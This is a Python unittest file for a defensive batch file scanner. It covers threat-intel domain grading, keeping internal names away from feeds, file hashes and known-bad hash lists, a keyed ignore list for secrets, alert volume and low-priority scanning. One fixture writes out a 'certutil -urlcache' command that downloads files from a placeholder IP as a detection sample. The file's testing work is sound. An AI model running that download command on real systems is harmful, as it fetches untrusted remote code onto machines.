"""
Batch scans: what counts as known-bad, keeping internal names away from the
feeds, file hashes and local known-bad hash lists, the ignore list, alert
volume, and giving way to the rest of the machine.
"""

import hashlib
import io
import json
import os
import shutil
import stat
import sys
import tarfile
import tempfile
import types
import unittest
import zipfile
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import _test_support  # noqa: E402,F401
from _test_support import reset_config  # noqa: E402

from src import batch_scan, file_scan, hash_feed  # noqa: E402
from src.scan_ignore import IgnoreList  # noqa: E402
from test_batch_scan import FakeAnalyzer  # noqa: E402


class GradedThreatIntel:
    """Answers like ThreatIntelEngine: HIGH for a listing, MEDIUM for a listed
    parent, LOW for the built-in dynamic-DNS and TLD guesses."""

    ANSWERS = {
        'evil.example.com': {'feed': 'urlhaus', 'category': 'Malware Distribution', 'confidence': 'HIGH'},
        'cdn.bad.example.net': {'feed': 'urlhaus', 'category': 'Malware Distribution',
                                'confidence': 'MEDIUM', 'match_type': 'parent_domain'},
        'files.example.xyz': {'feed': 'builtin', 'category': 'Suspicious TLD',
                              'description': 'Domain uses high-abuse TLD (.xyz)', 'confidence': 'LOW'},
        'home.duckdns.org': {'feed': 'builtin', 'category': 'Dynamic DNS',
                             'description': 'Domain uses dynamic DNS service', 'confidence': 'LOW'},
    }

    def __init__(self):
        self.asked = []

    def check_ip(self, ip):
        self.asked.append(ip)
        return None

    def check_domain(self, domain):
        self.asked.append(domain)
        return self.ANSWERS.get(domain)


class _Case(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix='scanbatch_')
        self.addCleanup(shutil.rmtree, self.tmp, True)
        self.ignore = IgnoreList(os.path.join(self.tmp, 'ignore.json'),
                                 os.path.join(self.tmp, 'ignore.key'))
        self.lists = hash_feed.HashLists(os.path.join(self.tmp, 'lists'))

    def file(self, rel, data):
        path = os.path.join(self.tmp, 'in', rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'wb') as f:
            f.write(data if isinstance(data, bytes) else data.encode('utf-8'))
        return path

    def scan(self, *paths, **kw):
        kw.setdefault('ignore', self.ignore)
        kw.setdefault('hash_lists', self.lists)
        return batch_scan.scan(list(paths), kw.pop('analyzer', None) or FakeAnalyzer(), **kw)


class TestKnownBad(_Case):
    """H3: a LOW-confidence guess (dynamic DNS, a .top TLD) was reported as known-bad."""

    TEXT = ('evil.example.com cdn.bad.example.net files.example.xyz home.duckdns.org\n'
            'fs01.corp.local printer.lan build.internal svc.example.test\n'
            '\\\\nas01\\share and Server=SQLPROD01; 10.1.2.3 198.51.100.7\n')

    def test_only_feed_listings_are_known_bad(self):
        report = self.scan(self.file('notes.txt', self.TEXT), threat_intel=GradedThreatIntel())
        self.assertEqual({t['value'] for t in report['threats']},
                         {'evil.example.com', 'cdn.bad.example.net'})
        self.assertEqual({t['value'] for t in report['suspicious']},
                         {'files.example.xyz', 'home.duckdns.org'})
        by_rule = {}
        for a in report['alerts']:
            by_rule.setdefault(a['rule_id'], []).append(a['severity'])
        self.assertEqual(by_rule['FILESCAN-THREAT-INTEL'], ['HIGH', 'HIGH'])
        self.assertEqual(by_rule['FILESCAN-SUSPICIOUS-INDICATOR'], ['LOW', 'LOW'])
        self.assertEqual((report['summary']['threats'], report['summary']['suspicious']), (2, 2))

    def test_internal_names_never_reach_a_feed(self):
        intel = GradedThreatIntel()
        self.scan(self.file('notes.txt', self.TEXT), threat_intel=intel)
        for name in ('fs01.corp.local', 'printer.lan', 'build.internal', 'svc.example.test',
                     'nas01', 'sqlprod01', '10.1.2.3'):
            self.assertNotIn(name, intel.asked)
        self.assertIn('evil.example.com', intel.asked)

    def test_window_top_is_not_known_bad_with_the_real_engine(self):
        from src.threat_intel import ThreatIntelEngine
        # an empty cache makes the engine fetch its feeds; tests stay offline
        with mock.patch.object(ThreatIntelEngine, '_download_feed', return_value=None):
            engine = ThreatIntelEngine(reset_config())
        report = self.scan(self.file('frame.js', 'if (window.top !== window.self) {}\n'
                                                 'load("https://static.example.top/a.js")\n'),
                           threat_intel=engine)
        self.assertEqual(report['threats'], [])
        self.assertNotIn('FILESCAN-THREAT-INTEL', {a['rule_id'] for a in report['alerts']})
        self.assertEqual([t['value'] for t in report['suspicious']], ['static.example.top'])

    def test_dns_names_from_captures_get_a_scope_too(self):
        class Capture(FakeAnalyzer):
            def analyze_file(self, path, callback=None):
                self.alerts = []
                return {'stats': {'top_dns_queries': [('wpad', 3), ('fs01.corp.local.', 2),
                                                      ('evil.example.com', 1)]}}
        intel = GradedThreatIntel()
        report = self.scan(self.file('cap.pcap', b'x'), analyzer=Capture(), threat_intel=intel)
        self.assertEqual([h['value'] for h in report['indicators']['host']], ['wpad'])
        self.assertEqual(intel.asked, ['evil.example.com'])


class TestHashes(_Case):

    def test_every_file_and_member_gets_its_sha256(self):
        a = b'alpha 192.0.2.10\n'
        b = b'bravo 192.0.2.11\n'
        c = b'charlie 192.0.2.12\n'
        tgz = io.BytesIO()
        with tarfile.open(fileobj=tgz, mode='w:gz') as tf:
            info = tarfile.TarInfo('c.txt')
            info.size = len(c)
            tf.addfile(info, io.BytesIO(c))
        zbuf = io.BytesIO()
        with zipfile.ZipFile(zbuf, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr('b.txt', b)
            zf.writestr('c.tgz', tgz.getvalue())
        report = self.scan(self.file('a.txt', a), self.file('pack.zip', zbuf.getvalue()))
        hashes = {f['file'].replace('\\', '/'): f['sha256'] for f in report['files']}
        sha = lambda d: hashlib.sha256(d).hexdigest()  # noqa: E731
        self.assertEqual(hashes['a.txt'], sha(a))
        self.assertEqual(hashes['pack.zip'], sha(zbuf.getvalue()))
        self.assertEqual(hashes['pack.zip/b.txt'], sha(b))
        self.assertEqual(hashes['pack.zip/c.tgz'], sha(tgz.getvalue()))
        self.assertEqual(hashes['pack.zip/c.tgz/c.txt'], sha(c))

    def test_the_hash_covers_the_whole_file_not_the_part_searched(self):
        data = b'0123456789' * 100
        with mock.patch.object(file_scan, 'MAX_TEXT_BYTES', 64):
            report = self.scan(self.file('long.log', data))
        (entry,) = report['files']
        self.assertEqual(entry['sha256'], hashlib.sha256(data).hexdigest())
        self.assertIn('only the first', entry['note'])

    def write_list(self, name, text):
        os.makedirs(self.lists.folder, exist_ok=True)
        with open(os.path.join(self.lists.folder, name), 'w', encoding='utf-8') as f:
            f.write(text)

    def test_files_on_a_local_known_bad_list_are_flagged(self):
        sample = b'MZ synthetic sample, not malware\n'
        digest = hashlib.sha256(sample).hexdigest()
        self.write_list('malwarebazaar_full.txt', '# sha256 list\n' + '0' * 64 + '\n' + digest + '\n')
        zbuf = io.BytesIO()
        with zipfile.ZipFile(zbuf, 'w') as zf:
            zf.writestr('dropper.bin', sample)
        report = self.scan(self.file('sample.bin', sample), self.file('mail.zip', zbuf.getvalue()))
        self.assertEqual(sorted(h['file'].replace('\\', '/') for h in report['malware']),
                         ['mail.zip/dropper.bin', 'sample.bin'])
        alerts = [a for a in report['alerts'] if a['rule_id'] == 'FILESCAN-KNOWN-BAD-HASH']
        self.assertEqual([a['severity'] for a in alerts], ['CRITICAL', 'CRITICAL'])
        self.assertEqual(report['summary']['malware'], 2)

    def test_lists_are_csv_or_text_and_reload_when_they_change(self):
        one, two = hashlib.sha256(b'1').hexdigest(), hashlib.sha256(b'2').hexdigest()
        self.write_list('export.csv', '"first_seen","sha256_hash","md5"\n'
                                      f'"2026-01-01 00:00:00","{one}","{"a" * 32}"\n')
        self.assertEqual(self.lists.load(), 1)
        self.assertEqual(self.lists.lookup(one)['feed'], 'export.csv')
        self.assertIsNone(self.lists.lookup(two))
        self.write_list('more.txt', two.upper() + '\n')
        self.assertEqual(self.lists.load(), 2)
        self.assertIsNotNone(self.lists.lookup(two))
        self.assertIsNone(self.lists.lookup('not hex'))

    def test_no_lists_means_no_lookups(self):
        report = self.scan(self.file('x.txt', b'hello'))
        self.assertEqual(report['malware'], [])


class TestIgnoreList(_Case):
    TEXT = 'password = "Synth-Ignore-001"\naws = AKIAIOSFODNN7EXAMPLE\nhost noise.example.com\n'

    def test_an_ignored_secret_stays_out_of_later_scans(self):
        path = self.file('app.conf', self.TEXT)
        first = self.scan(path)
        secret = next(s for s in first['secrets'] if s['kind'] == 'password')
        self.assertRegex(secret['ignore_key'], r'^[0-9a-f]{64}$')
        self.ignore.add_finding(secret, note='test fixture')
        second = self.scan(path)
        self.assertEqual([s['kind'] for s in second['secrets']], ['aws_access_key'])
        self.assertEqual(second['summary']['ignored'], 1)

    def test_the_hash_is_keyed_per_install(self):
        other = IgnoreList(os.path.join(self.tmp, 'o.json'), os.path.join(self.tmp, 'o.key'))
        plain = hashlib.sha256(b'password\x00Synth-Ignore-001').hexdigest()
        mine = self.ignore.digest('password', 'Synth-Ignore-001')
        self.assertNotEqual(mine, plain)
        self.assertNotEqual(mine, other.digest('password', 'Synth-Ignore-001'))
        reopened = IgnoreList(self.ignore.path, self.ignore.key_path)
        self.assertEqual(reopened.digest('password', 'Synth-Ignore-001'), mine)

    def test_cards_and_ssns_are_ignored_only_where_they_are(self):
        card = '4111 1111 1111 1111'
        path = self.file('orders.csv', f'id,card\n1,{card}\n')
        first = self.scan(path)
        (secret,) = first['secrets']
        self.assertNotIn('ignore_key', secret)
        with self.assertRaises(ValueError):
            self.ignore.add_value('card_number', card)
        entry = self.ignore.add_finding(secret)
        self.assertEqual((entry['type'], entry['line']), ('location', 2))
        self.assertEqual(self.scan(path)['secrets'], [])
        elsewhere = self.scan(self.file('other.csv', f'id,card\n1,{card}\n'))
        self.assertEqual(len(elsewhere['secrets']), 1)

    def test_indicators_can_be_ignored_by_value(self):
        path = self.file('app.conf', self.TEXT)
        self.ignore.add_finding({'kind': 'domain', 'value': 'noise.example.com'})
        report = self.scan(path)
        self.assertEqual(report['indicators']['domain'], [])

    def test_listing_removing_and_keeping_entries(self):
        path = self.file('app.conf', self.TEXT)
        secret = self.scan(path)['secrets'][0]
        entry = self.ignore.add_finding(secret)
        self.assertEqual(self.ignore.add_finding(secret)['id'], entry['id'], 'no duplicates')
        listed = IgnoreList(self.ignore.path, self.ignore.key_path).entries()
        self.assertEqual([e['id'] for e in listed], [entry['id']])
        self.assertNotIn('digest', listed[0])
        self.assertEqual(listed[0]['shown'], secret['value'])
        with open(self.ignore.path, encoding='utf-8') as f:
            self.assertNotIn('Synth-Ignore-001', f.read())
        self.assertTrue(self.ignore.remove(entry['id']))
        self.assertFalse(self.ignore.remove(entry['id']))
        self.assertEqual(len(self.scan(path)['secrets']), 2)

    @unittest.skipIf(sys.platform == 'win32', 'POSIX file modes')
    def test_the_key_file_is_private(self):
        self.ignore.digest('x', 'y')
        self.assertEqual(stat.S_IMODE(os.stat(self.ignore.key_path).st_mode), 0o600)

    def test_the_browser_scan_can_edit_the_list(self):
        from src.web_scan import ScanError, ScanSessions
        sessions = ScanSessions(FakeAnalyzer, ignore_list=self.ignore)
        secret = self.scan(self.file('app.conf', self.TEXT))['secrets'][0]
        entry = sessions.ignore(dict(secret, file='app.conf'))
        self.assertEqual([e['id'] for e in sessions.ignored()], [entry['id']])
        self.assertTrue(sessions.unignore(entry['id']))
        for bad in ('x', {'kind': ''}, {'kind': 'password', 'line': 'one'},
                    {'kind': 'password', 'value': 'masked**'}):
            with self.subTest(bad=bad), self.assertRaises(ScanError):
                sessions.ignore(bad)
        with self.assertRaises(ScanError):
            sessions.unignore('nope')


class TestAlertVolume(_Case):

    def test_one_alert_per_kind_per_file(self):
        text = ''.join(f'password = Synth{i:03d}x!\n' for i in range(120))
        text += ''.join(f'key{i} = AKIA{"ABCDEFGHJKLMNPQR"[i:] + "ABCDEFGHJKLMNPQR"[:i]}\n' for i in range(3))
        report = self.scan(self.file('dump.txt', text))
        alerts = [a for a in report['alerts'] if a['rule_id'] == 'FILESCAN-SECRET']
        counts = sorted((a['evidence']['kind'], a['evidence']['count']) for a in alerts)
        self.assertEqual(counts, [('aws_access_key', 3), ('password', 120)])
        self.assertEqual(report['summary']['secrets'], 123)
        self.assertEqual(len(report['secrets']), file_scan.MAX_SECRETS_PER_KIND + 3)
        pw = next(a for a in alerts if a['evidence']['kind'] == 'password')
        self.assertIn('(120 found)', pw['title'])
        self.assertEqual(len(pw['evidence']['lines']), 20)

    def test_script_findings_are_alerts_too(self):
        report = self.scan(self.file('job.cmd', 'certutil' + ' -urlcache -f http://198.51.100.9/a a\n'
                                                'certutil' + ' -urlcache -f http://198.51.100.9/b b\n'))
        (alert,) = [a for a in report['alerts'] if a['rule_id'] == 'FILESCAN-SCRIPT']
        self.assertEqual((alert['severity'], alert['evidence']['count']), ('HIGH', 2))
        self.assertEqual(report['summary']['findings'], 2)


class TestGivingWay(_Case):

    def test_a_scan_pauses_between_files(self):
        paths = [self.file(f'{i}.txt', b'x') for i in range(3)]
        with mock.patch.object(batch_scan.time, 'sleep') as sleep:
            self.scan(*paths)
        self.assertGreaterEqual(sleep.call_count, 3)

    def test_windows_scans_run_in_background_mode(self):
        kernel32 = mock.Mock()
        kernel32.GetCurrentThread.return_value = 'thread'
        kernel32.SetThreadPriority.return_value = 1
        fake_ctypes = types.SimpleNamespace(windll=types.SimpleNamespace(kernel32=kernel32))
        with mock.patch.object(batch_scan.sys, 'platform', 'win32'), \
                mock.patch.dict(sys.modules, {'ctypes': fake_ctypes}):
            self.scan(self.file('a.txt', b'x'))
        self.assertEqual(kernel32.SetThreadPriority.call_args_list,
                         [mock.call('thread', 0x00010000), mock.call('thread', 0x00020000)])

    def test_linux_scans_use_idle_io_for_the_scanning_thread(self):
        proc = mock.Mock()
        proc.ionice.side_effect = [types.SimpleNamespace(ioclass=2, value=4), None, None]
        fake_psutil = types.SimpleNamespace(Process=mock.Mock(return_value=proc), IOPRIO_CLASS_IDLE=3)
        with mock.patch.object(batch_scan.sys, 'platform', 'linux'), \
                mock.patch.dict(sys.modules, {'psutil': fake_psutil}):
            self.scan(self.file('a.txt', b'x'))
        fake_psutil.Process.assert_called_once_with(batch_scan.threading.get_native_id())
        self.assertEqual(proc.ionice.call_args_list, [mock.call(), mock.call(3), mock.call(2, 4)])

    def test_low_priority_can_be_turned_off(self):
        class Config:
            def get(self, section, key, default=None):
                return False if (section, key) == ('file_scan', 'low_priority') else default
        with mock.patch.object(batch_scan, '_lower_this_thread') as lower:
            self.scan(self.file('a.txt', b'x'), config=Config())
        lower.assert_not_called()

    def test_progress_names_archive_members(self):
        zbuf = io.BytesIO()
        with zipfile.ZipFile(zbuf, 'w') as zf:
            zf.writestr('inner.tgz', b'')
        seen = []
        tgz = io.BytesIO()
        with tarfile.open(fileobj=tgz, mode='w:gz') as tf:
            info = tarfile.TarInfo('deep.txt')
            info.size = 2
            tf.addfile(info, io.BytesIO(b'ok'))
        with zipfile.ZipFile(zbuf, 'w') as zf:
            zf.writestr('inner.tgz', tgz.getvalue())
        self.scan(self.file('p.zip', zbuf.getvalue()),
                  on_progress=lambda i, n, name: seen.append(name.replace('\\', '/')))
        self.assertEqual(seen, ['p.zip/inner.tgz', 'p.zip/inner.tgz/deep.txt'])

    def test_the_report_stays_json(self):
        report = self.scan(self.file('a.txt', 'password = "Synth-Json-1"\n'))
        json.dumps(report)


if __name__ == '__main__':
    unittest.main()
